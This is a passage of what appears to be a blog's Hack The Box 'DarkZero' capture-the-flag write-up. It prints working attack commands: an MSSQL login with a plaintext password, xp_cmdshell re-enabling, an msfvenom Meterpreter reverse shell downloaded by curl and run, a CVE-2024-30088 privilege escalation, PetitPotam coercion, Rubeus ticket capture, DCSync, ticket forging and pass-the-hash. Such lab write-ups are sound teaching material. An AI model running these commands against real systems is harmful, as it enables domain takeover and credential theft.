+<p>Sadly enough we don't find alot of info that we hoped to find. But whe have found one clue and that is a different domain, <code>darkzero.ext</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/7.png" /></p>
+<p>With all the information we have now we know a couple of things, <code>john.w</code> does not have acces to any shares, there is a .ext domain and what we haven't digged into yet is the <code>mssql</code> being open.</p>
+<p>That's our next step. <code>impacket</code> is usefull for alot of things, it also helps us to possibly login to the mssql seerver. Let's test it out by running.</p>
+<p><code>impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!@10.129.110.78' -windows-auth</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/8.png" /></p>
+<p>We have succesfully logged into the <code>mssql</code> server as john.w! the querys for mssql are a  little different then what we are used to. Same language, different accent as we may say.</p>
+<p>After a bit of guessing work and knowing that <code>name</code> is one of the most common names for a column with names, we dig around.</p>
+<p>Not being too familiar with <code>mssql</code>, I straight up fire away <code>select</code> commands to see if I can grab something usefull. Eventually I struck something, a server that ends with ext.</p>
+<p><code>SELECT name FROM sys.servers</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/9.png" /></p>
+<p>Running <code>help</code> gives us the next clue. It shows us the commands that we can perform. We see that we can link to another server using <code>use_link</code>.</p>
+<p><code>use_link "DC02.darkzero.ext"</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/11.png" /></p>
+<p>Now we hopped on <code>DC02</code>. Enumerating dc02 we found nothing very usefull. Nothing crazy that we can use, but looking back at the help menu we see that we can use <code>cmd</code> using the <code>xp_cmdshell</code> command. Using this command we can directly execute <code>cmd</code> and even perform something like a <code>reverse shell</code> into the host of the server.</p>
+<hr />
+<h2 id="exploit">💥 EXPLOIT<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>We know enough information to try to create a <code>reverse shell</code> with <code>msfvenom</code> and send it over to the host as <code>dc02</code> with as listener being on <code>msfconsole</code>. The shell will be generated as a executable <code>.exe</code> so we can run it from <code>dc02</code> with <code>xp_cmdshell</code> so it will be triggerd.</p>
+<p>We will generate our .exe through <code>msfvenom</code>. I chose <code>lhost</code> to be <code>tun0</code> so it will always be set to my ip, and <code>lport</code> to 4444 but you can always change it to your prefered port.</p>
+<p>Generated a Meterpreter payload:</p>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o meterp_x64_tcp.exe</code></p>
+<p>with the .exe being generated, set up a python http server where the file is stored! If you set it up where the file isn't reachable we can not curl it into the mssql.</p>
+<p>Running <code>python3 -m http.server 8000</code> into our terminal creates us a amazing way to store the .exe to the mssql.</p>
+<p>curling our file into mssql and directly storing it we use this command.</p>
+<p><code>xp_cmdshell curl 10.10.14.138:8000/meterp_x64_tcp.exe -o C:\Windows\Temp\meterp_x64_tcp.exe</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/12.png" /></p>
+<p>Hmm, we got an error, <code>SQL blocked access to sys.xp_cmdshell</code>. Luckily, we can get around this and gain acces to xp_cmdshell with just a few commands.
+<div class="highlight"><pre><span></span><code>sp_configure &#39;show advanced options&#39;, 1;
+RECONFIGURE;
+sp_configure &#39;xp_cmdshell&#39;, 1;
+RECONFIGURE;
+</code></pre></div></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/13.png" /></p>
+<p>We have successfully send <code>meterp_x64_tcp.exe</code> over to <code>C:\Windows\Temp</code>. That leaves us for one step. Get the listener running.</p>
+<p>Open up your <code>msfconsole</code>.</p>
+<p>And type in order.</p>
+<div class="highlight"><pre><span></span><code>use exploit/multi/handler
+
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+set LHOST tun0
+
+set LPORT 4444
+</code></pre></div>
+<p><img alt="" src="../../../assets/writeups/darkzero/14.png" /></p>
+<p>Last thing to do is type <code>run</code>. Now that the reverse TCP handler is running, we will switch over to the <code>mssql</code> and make sure we execute the .exe to gain connection.</p>
+<p><code>EXEC xp_cmdshell 'C:\Windows\Temp\meterp_x64_tcp.exe';</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/15.png" /></p>
+<p>Now we have <code>meterpreter</code> running we can use the <code>shell</code> command to go in as a shell, and type <code>exit</code> to go back to <code>meterpreter</code>.</p>
+<p>typing <code>getuid</code> gets us the user id, and that came back with <code>Server username: darkzero-ext\svc_sql</code>.</p>
+<p>checking our privileges with <code>whoami /priv</code> doesnt make me excited.</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/16.png" /></p>
+<p>Normally, we can go to <code>Users</code> and go to <code>Desktop</code> to get <code>user.txt</code> but it's not there. We probably need to elevate our privileges to go to user because we are using the <code>svc_sql</code> account to browse around.</p>
+<p>We know that we can export files etc to the server, so the best thing to do now to enumerate the server further is to export <code>winPEAS</code> to the server.</p>
+<p>Making it ourselves easier we will use <code>meterpreter</code> to upload the .exe to the server!</p>
+<p>So, <code>exit</code> back if you are in as <code>shell</code> and type
+<code>cd C:\Users\svc_sql\AppData\local\temp</code>
+<code>upload &lt;pwd/winPEASx64.exe&gt;</code></p>
+<p>Going to the destined folder is easier to upload to. We know by <code>getuid</code> that we are <code>svc_sql</code> so why not dump our .exe there.</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/17.png" /></p>
+<p>Now we have that, let's go bet as <code>shell</code> and type dir to check if it is really in the temp folder of svc_sql.</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/18.png" /></p>
+<p>We see that we have <code>winPEASx64</code>! You run winpeas by simply typing its .exe name, <code>winPEASx64.exe</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/19.png" /></p>
+<p><code>winPEAS</code> does take a while, so let it run and it will be done shortly.</p>
+<p>If you don't know where to look for while using <code>winPEAS</code>, don't worry. <code>winPEAS</code> has their own legend that makes it easier to navigate.</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/20.png" /></p>
+<p>Focus on the red text that comes by.</p>
+<p>After doing <em>alot</em> of reading, something catches my eye.</p>
+<p><code>kernel32</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/21.png" /></p>
+<p>Using google to find more about <code>kernel32</code> we find this site: https://attackerkb.com/topics/y8MOqV0WPr/cve-2024-30088</p>
+<p><em>Exploitability - High</em>, we will try to use this to elevate further to get user.txt.</p>
+<p>When you are still as <code>shell</code>, <code>exit</code> back to <code>meterpreter</code> and type <code>background</code>. The session is still running but it is running in the background as we try to exploit <code>kernel32</code> with the found <code>cve-2024-30088</code>.</p>
+<p>When backed all the way out type:</p>
+<p><code>use exploit/windows/local/cve_2024_30088_authz_basep</code> To set the CVE
+<code>set LHOST tun0</code>
+<code>set LPORT 4444</code>
+<code>show sessions</code> To see what session Id our background is running as.
+<code>set session &lt;Id&gt;</code>
+<code>run</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/22.png" /></p>
+<p>If the session dies or anything goes wrong, re run making the connection, going to background and then using the exploit again.</p>
+<p>Let's go to <code>shell</code> and navigate to <code>Users</code>. As we saw before the server only has <strong>2</strong> accounts. <code>svc_sql</code> and <code>Administrator</code>. svc doesnt have the <code>user.txt</code>, and now typing <code>whoami</code> in the terminal in shell we see that we are no longer <code>svc_sql</code> but <code>nt authority\system</code>! Let's go to <code>Administrator</code> and check if user is at <code>Desktop</code>.</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/23.png" /></p>
+<p>We have found <code>user.txt</code>!</p>
+<hr />
+<h2 id="privilege-escalation">🛡️ PRIVILEGE ESCALATION<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<p>For privesc we will try to catch a <strong>ticket</strong> and use that to impersonate to login as Admin eventually.</p>
+<p>To do that we will upload <code>Rubeus.exe</code> to the server so we can see and catch the tickets, as we then trigger the ticket we want to use.</p>
+<p>Go back to <code>meterpreter</code> using <code>exit</code> and type <code>upload &lt;Path-to-your-Rubeus.exe&gt;</code>. I uploaded it while being in svc_sql/Desktop.</p>
+<p>After you got it uploaded, you will run Rubeus to get the Encoded Tickets, using</p>
+<p><code>Rubeus.exe monitor /interval:5 /nowrap</code></p>
+<p>It will monitor every 5 seconds for new <code>TGTs</code>.</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/24.png" /></p>
+<p>We have catched multiple <code>TGTs</code> like, DC01, svc_sql and even Administrator. We want to catch the TGT of <code>DC01</code> but sadly enough it didnt pop up. We can trigger it by using a tool called <code>PetitPotam</code>.</p>
+<p>We use it by sending</p>
+<p><code>python3 /opt/tools/PetitPotam.py -d darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' DC02.darkzero.ext DC01.darkzero.htb -pipe all</code></p>
+<p>for me it works more reliable then spamming <code>xp_dirtree</code>.</p>
+<p>Now when we look back at Rubeus we see that a new Ticket has popped up!</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/25.png" /></p>
+<p>Now we will do a couple of things, at first.</p>
+<p>Copy the <code>Base64EncodedTicket</code> and <code>nano</code> a .b64 file and place the value inside of it. Next run <code>base64 -d ticket.b64 &gt; dc01.kirbi</code>. We turn it into a .kirbi so we can use <code>ticketConverter</code> to turn it into a .ccache. Now finally we use <code>ticketConverter.py dc01.kirbi dc01.ccache</code> and it returns us the .ccache that we will use for our <code>KRB5CCNAME</code>.</p>
+<p>Let's set our .ccache as our way to authenticate as <code>export KRB5CCNAME=dc01.ccache</code>. If you want to you can look inside of the .ccache to check if everything works with <code>klist -c filename.ccache</code>.</p>
+<p>Now we have the .ccache set up, we will cacth the kerberos keys to get to the next step using.</p>
+<p><code>secretsdump.py -k -no-pass -dc-ip &lt;ip&gt; -just-dc-user DC01$ @darkzero.htb</code></p>
+<p>if you see issues with time use <code>sudo ntpdate &lt;target ip&gt;</code>.</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/26.png" /></p>
+<p>We need the aes256 key to create a <code>golden ticket</code>. To perform a Golden Ticket attack in Active Directory, we need to generate a forged Kerberos Ticket Granting Ticket <code>(TGT)</code> that’s trusted by the Key Distribution Center <code>(KDC)</code>. Here’s how I did it in my workflow, with an explanation of each piece:</p>
+<p><code>krbtgt AES key</code>: extracted using DCSync (secretsdump.py or mimikatz) after gaining high privileges on a DC. This key signs Kerberos tickets.</p>
+<p><code>Domain SID</code>: unique identifier for the Active Directory domain. Also grabbed via secretsdump.py or similar.</p>
+<p><code>Domain FQDN</code>: e.g., DARKZERO.HTB.</p>
+<p><code>RID/User ID and username</code>: the account you want to impersonate; for machine accounts, add a $ at the end (e.g., DC01$).</p>
+<div class="highlight"><pre><span></span><code>ticketer.py<span class="w"> </span>-aesKey<span class="w"> </span>25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-domain-sid<span class="w"> </span>S-1-5-21-1152179935-589108180-1989892463<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-domain<span class="w"> </span>DARKZERO.HTB<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-user-id<span class="w"> </span><span class="m">1000</span><span class="w"> </span>DC01$
+</code></pre></div>
+<p>So basically,</p>
+<ul>
+<li>
+<p><code>aesKey</code> tells ticketer.py which key to use for forging and signing the ticket – this must be the actual krbtgt AES key from the domain.</p>
+</li>
+<li>
+<p><code>domain-sid</code> is the domain's SID so the ticket matches the domain context.</p>
+</li>
+<li>
+<p><code>domain</code> is the human-readable FQDN of the target AD domain.</p>
+</li>
+<li>
+<p><code>user-id</code> is the RID (Relative Identifier) for the user or computer.</p>
+</li>
+<li>
+<p><code>user DC01$</code> specifies the user account you are forging the ticket for. Here it’s a computer account.</p>
+</li>
+</ul>
+<p>Long story short, we use and run this to impersonate a user.</p>
+<p>When you ran that command, you will recieve a different .ccache.</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/27.png" /></p>
+<p>We will use that specific .ccache and set it as our <code>export KRB5CCNAME=DC01$.ccache</code> so we will try to run <code>secretsdump.py</code> again and dump Administrator hashes.</p>
+<p><code>secretsdump.py -k -no-pass -dc-ip &lt;ip&gt; -just-dc-user Administrator @darkzero.htb</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/28.png" /></p>
+<p>It worked! We now have the <code>Administrator</code> hash and can try to login as admin.</p>
+<p>You can use many tools for this but I stayed basic and chose <code>evil-winrm</code>.</p>
+<p>Run your command with <code>-i</code> for ip <code>-u</code> for username and <code>-H</code> for the 0x17 hash you found while dumping <code>Administrator</code>.</p>
+<p><code>evil-winrm -i &lt;ip&gt; -u Administrator -H &lt;NTLM_hash&gt;</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/root.png" /></p>
+<p>And after you logged in, as you can see we checked with <code>whoami</code> our privileges, and dove straight to <code>Desktop</code> to get our <code>root.txt</code>.</p>
+<hr />
+<h2 id="final-thoughts">📎 Final thoughts<a class="headerlink" href="#final-thoughts" title="Permanent link">&para;</a></h2>
+<p>DarkZero is a fantastic test of advanced Windows exploitation. It pushed me to combine enumeration, privilege escalation, pass-the-hash, and persistence techniques. This challenge deepened my understanding of the Kerberos ticketing process, and the importance of monitoring and securing AD environments against these post-exploitation tactics.</p>
+<hr />
+<h2 id="lessons-learned">📘 LESSONS LEARNED<a class="headerlink" href="#lessons-learned" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p>Active Directory attacks often require chaining multiple techniques: lateral movement, Kerberos abuse, hash extraction.</p>
+</li>
+<li>
+<p>Time synchronization is absolutely critical for Kerberos-based exploits.</p>
+</li>
+<li>
+<p>Golden Ticket attacks demonstrate how dangerous it is if krbtgt keys are leaked.</p>
+</li>
+<li>
+<p>Always enumerate thoroughly—unexpected clues (like a secondary domain) can change your attack chain.</p>
+</li>
+<li>
+<p>Tools like BloodHound and winPEAS are invaluable for visibility.</p>
+</li>
+</ul>
+<hr />
+<h2 id="references">📚 REFERENCES<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<p>PetitPotam: https://github.com/topotam/PetitPotam</p>
+<p>Rubeus: https://github.com/GhostPack/Rubeus</p>
+<p>Kerberos Golden Ticket Attack explanation: https://www.picussecurity.com/resource/blog/golden-ticket-attack-mitre-t1558.001</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../return/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Return">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Return
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../../tools/" class="md-footer__link md-footer__link--next" aria-label="Next: Tools">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Tools
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      &copy; 2025 Certifa
+    </div>
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/Certifa" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://app.hackthebox.com/profile/444744" target="_blank" rel="noopener" title="app.hackthebox.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m22.51 6.457.001-.013a.89.89 0 0 0-.271-.638l-.027-.024q-.028-.025-.057-.048-.03-.022-.06-.04l-.029-.02-9.61-5.547a.89.89 0 0 0-.922.004L1.933 5.674l-.03.02-.023.014-.02.015a1 1 0 0 0-.147.134l-.003.003a.9.9 0 0 0-.221.584v.014l-.001.027v11.07c0 .328.18.63.469.784l9.599 5.542.023.011a1 1 0 0 0 .166.07l.04.01.072.015q.018.004.035.006a.8.8 0 0 0 .216 0q.018-.002.035-.006l.072-.014.04-.012.064-.022a1 1 0 0 0 .102-.047l.023-.011 9.599-5.542a.89.89 0 0 0 .469-.784V6.478zM5.255 6.082l6.537-3.774a.42.42 0 0 1 .418 0l6.537 3.774a.418.418 0 0 1 0 .725l-6.537 3.774a.42.42 0 0 1-.418 0L5.254 6.807a.418.418 0 0 1 0-.725m5.614 14.345a.417.417 0 0 1-.626.361l-6.524-3.766a.42.42 0 0 1-.209-.361V9.127a.417.417 0 0 1 .626-.361l6.524 3.766a.42.42 0 0 1 .209.362zm9.623-3.766a.42.42 0 0 1-.209.36l-6.524 3.767a.417.417 0 0 1-.626-.36v-7.533c0-.15.08-.287.209-.362l6.524-3.766a.417.417 0 0 1 .626.36z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.path", "navigation.top", "navigation.footer", "toc.follow", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link", "navigation.expand", "toc.integrate"], "search": "../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
+      
+    
+  </body>
+</html>
